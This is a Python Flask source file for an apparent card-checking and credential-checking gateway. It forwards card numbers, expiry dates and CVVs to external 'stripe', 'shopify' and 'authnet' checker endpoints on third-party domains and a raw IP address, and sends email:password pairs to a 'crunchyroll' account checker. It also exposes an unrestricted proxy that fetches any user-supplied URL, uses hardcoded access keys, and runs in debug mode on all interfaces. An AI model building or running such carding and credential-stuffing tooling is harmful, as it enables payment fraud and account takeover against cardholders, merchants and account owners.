from flask import Flask, request, jsonify, Response
import requests
import re

app = Flask(__name__)

# --- Configuration ---

# Simple key-based authentication.
VALID_KEYS = [
    "darkboy",
    "testkey123",
    "educationalkey"
]

# Define the external API endpoints and their required parameters
API_ROUTES = {
    # 1. Stripe StormX Gateway
    "stormx_stripe": {
        "url": "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site={site}/cc={cc}|{mm}|{yy}|{cvv}",
        "params": ["cc", "mm", "yy", "cvv", "site"]
    },
    # 2. Autosh Wuaze Gateway
    "autosh_wuaze": {
        "url": "https://autosh.wuaze.com/?cc={cc}|{mm}|{yy}|{cvv}&site={site}",
        "params": ["cc", "mm", "yy", "cvv", "site"]
    },
    # 3. Multi-Gateway Server (135.148.14.197)
    "stripe1": {
        "url": "http://135.148.14.197:5000/stripe1?cc={cc}|{mm}|{yy}|{cvv}",
        "params": ["cc", "mm", "yy", "cvv"]
    },
    "stripe5": {
        "url": "http://135.148.14.197:5000/stripe5?cc={cc}|{mm}|{yy}|{cvv}",
        "params": ["cc", "mm", "yy", "cvv"]
    },
    "shopify1": {
        "url": "http://135.148.14.197:5000/shopify1?cc={cc}|{mm}|{yy}|{cvv}",
        "params": ["cc", "mm", "yy", "cvv"]
    },
    "authnet1": {
        "url": "http://135.148.14.197:5000/authnet1?cc={cc}|{mm}|{yy}|{cvv}",
        "params": ["cc", "mm", "yy", "cvv"]
    },
    "crunchyroll": {
        "url": "http://135.148.14.197:8000/crunchyroll?email={email}:{password}",
        "params": ["email", "password"]
    },
    # Generic Proxy Gateway
    "ham_harama": {
        "url": "{full_url}",
        "params": ["full_url"]
    }
}

# --- Helper Functions ---

def send_error(message, code=400):
    """Sends a JSON error response."""
    return jsonify({"status": "error", "message": message}), code

def get_user_params():
    """Collects all user-provided parameters from the query string."""
    params = dict(request.args)
    params.pop('api_name', None)
    params.pop('key', None)
    return params

# --- Routes ---

@app.route('/')
def index():
    """Landing page route."""
    # In a real Flask app, this would use render_template, but for simplicity, we read the static file.
    try:
        with open('index.html', 'r') as f:
            return f.read()
    except FileNotFoundError:
        return "<h1>API Gateway Running</h1><p>Use /api/v1/ to access the gateway.</p>"

@app.route('/api/v1/<api_name>', methods=['GET'])
def api_gateway(api_name):
    """Main API gateway logic."""
    user_key = request.args.get('key')

    # 1. Key-based Authentication
    if not user_key or user_key not in VALID_KEYS:
        return send_error("Authentication failed. Invalid user key.", 401)

    # 2. Dynamic Routing
    if api_name not in API_ROUTES:
        return send_error(f"API endpoint '{api_name}' not found.", 404)

    route = API_ROUTES[api_name]
    required_params = route['params']
    user_params = get_user_params()

    # 3. Parameter Validation
    missing_params = [p for p in required_params if p not in user_params]
    if missing_params:
        return send_error(f"Missing required parameters for '{api_name}': {', '.join(missing_params)}")

    # 4. Construct the Target URL
    target_url = route['url']

    if api_name == 'ham_harama':
        # Generic proxy: use the full_url parameter directly
        target_url = user_params.get('full_url')
        if not target_url:
            return send_error("Missing 'full_url' parameter for ham_harama endpoint.")
    else:
        # Specific API: replace placeholders
        for key, value in user_params.items():
            if key in required_params:
                # Special handling for crunchyroll email:password format
                if api_name == 'crunchyroll' and key == 'password':
                    full_value = f"{user_params.get('email')}:{value}"
                    target_url = target_url.replace(f"{{{key}}}", requests.utils.quote(full_value))
                else:
                    # Replace placeholder with URL-encoded value
                    target_url = target_url.replace(f"{{{key}}}", requests.utils.quote(value))

    # 5. Forward the Request (Proxy)
    try:
        # Forward headers for better compatibility (e.g., User-Agent)
        headers_to_forward = {}
        for header in ['User-Agent', 'Accept-Language']:
            if header in request.headers:
                headers_to_forward[header] = request.headers[header]

        # Use a timeout for the external request
        response = requests.get(target_url, headers=headers_to_forward, timeout=15)
        
        # 6. Handle Response
        # Create a Flask response object from the requests response
        flask_response = Response(response.content, status=response.status_code)
        
        # Copy headers from the external API response
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        for key, value in response.headers.items():
            if key.lower() not in excluded_headers:
                flask_response.headers[key] = value

        return flask_response

    except requests.exceptions.Timeout:
        return send_error("Gateway proxy error: External API request timed out.", 504)
    except requests.exceptions.RequestException as e:
        return send_error(f"Gateway proxy error: Could not connect to external API. ({e})", 503)

if __name__ == '__main__':
    # Use a production-ready server like Gunicorn for deployment on Render
    # For local testing: app.run(debug=True, host='0.0.0.0', port=5000)
    # Render will use the Gunicorn command specified in the service settings.
    app.run(debug=True, host='0.0.0.0', port=5000)
